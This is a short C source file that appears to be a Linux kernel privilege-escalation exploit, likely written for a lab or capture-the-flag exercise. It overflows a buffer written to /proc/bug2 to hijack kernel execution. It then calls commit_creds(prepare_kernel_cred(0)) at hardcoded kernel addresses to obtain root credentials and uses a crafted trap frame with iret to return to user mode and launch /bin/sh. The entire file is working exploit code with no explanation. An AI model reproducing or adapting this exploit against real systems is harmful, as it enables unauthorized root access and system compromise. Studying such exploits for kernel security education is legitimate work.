#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
 
struct trap_frame{
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
};
struct trap_frame tf;
 
void launch_shell(){
    execl("/bin/sh","sh",NULL);
}
 
void prepare_tf(){
    asm("pushl %cs;"
        "popl tf+4;" //set cs
        "pushfl;"
        "popl tf+8;" //set eflags;
        "pushl %esp;"
        "popl tf+12;" //set esp;
        "pushl %ss;"
        "popl tf+16;"); //set ss;
    tf.eip = &launch_shell;
    tf.esp -= 1024;
}
 
#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void *) KERNCALL = (void*)0xc10682e0;
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *)0xc1068480;
 
void payload(void){
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf,%esp;"
        "iret;"
        );
}
 
int main(){
    char buf[24]={0};
    memset(buf,'A',20);
    *(void **)(buf+20) = &payload;
    prepare_tf();
 
    int fd=open("/proc/bug2",O_WRONLY);
    write(fd,buf,sizeof(buf));
}
 
